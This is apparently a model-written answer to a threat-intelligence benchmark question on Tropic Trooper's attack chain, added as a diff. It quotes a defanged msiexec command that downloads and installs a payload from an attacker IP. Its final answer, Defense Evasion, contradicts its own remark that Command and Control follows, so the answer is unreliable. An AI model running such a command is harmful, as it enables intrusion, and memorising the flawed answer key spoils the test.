@@ -1,0 +1,65 @@
+### Step-by-Step Analysis
+
+#### 1. Analyze the CTI Report
+
+**Initial Access:**
+- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
+- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
+
+**Execution:**
+- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
+- UserInstall.exe dropped a normal sidebar.exe file, a malicious loader (wab32res.dll), and an encrypted configuration file.
+- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
+- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
+- The loader injected a DLL backdoor into dllhost.exe.
+
+**Persistence:**
+- The backdoor decrypts the configuration file and uses SSL to connect to C&C servers.
+
+**Command and Control:**
+- TClient used SSL to connect to Tropic Trooper's C&C server.
+- The C&C server and configuration values are not hardcoded, allowing for easy updates.
+
+**Others:**
+- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
+- The MSI file drops three files and creates a hidden directory (UFile) to evade detection.
+- TClient uses custom SSL libraries to connect to the C&C server.
+
+#### 2. Analyze the Question
+
+**Question:**
+Which ATT&CK tactic most likely occurred after Tropic Trooper used DLL hijacking through the benign file sidebar.exe to evade antivirus detection?
+
+**Answer Choices:**
+A: Collection
+B: Discovery
+C: Defense Evasion
+D: Command and Control
+
+#### 3. Compare and Evaluate
+
+**Key Points from the CTI Report:**
+- DLL hijacking is used to load the malicious wab32res.dll through the benign file sidebar.exe.
+- This is done to evade antivirus detection.
+
+**Tactics to Consider:**
+- **Collection:** Involves gathering data from the system.
+- **Discovery:** Involves gathering information about the system and network.
+- **Defense Evasion:** Involves techniques to avoid detection by security tools.
+- **Command and Control:** Involves communication with the attacker's infrastructure.
+
+**Evaluation:**
+- **Collection (A):** This tactic is not directly related to evading detection. It is more about gathering data.
+- **Discovery (B):** This tactic is about gathering information, which is not the immediate next step after evading detection.
+- **Defense Evasion (C):** This tactic is directly related to techniques used to avoid detection, which aligns with the use of DLL hijacking to load the malicious DLL through a benign file.
+- **Command and Control (D):** This tactic involves communication with the C&C server, which is a subsequent step after establishing persistence and evading detection.
+
+#### 4. Provide a Step-by-Step Reasoning and Final Answer
+
+**Reasoning:**
+- The CTI report clearly states that Tropic Trooper used DLL hijacking to load the malicious wab32res.dll through the benign file sidebar.exe to evade antivirus detection.
+- The immediate next step after evading detection is to ensure that the malicious payload remains undetected and continues to operate.
+- The tactic of **Defense Evasion** is the most appropriate choice as it directly addresses the technique used to avoid detection.
+
+**Final Answer:**
+C: Defense Evasion
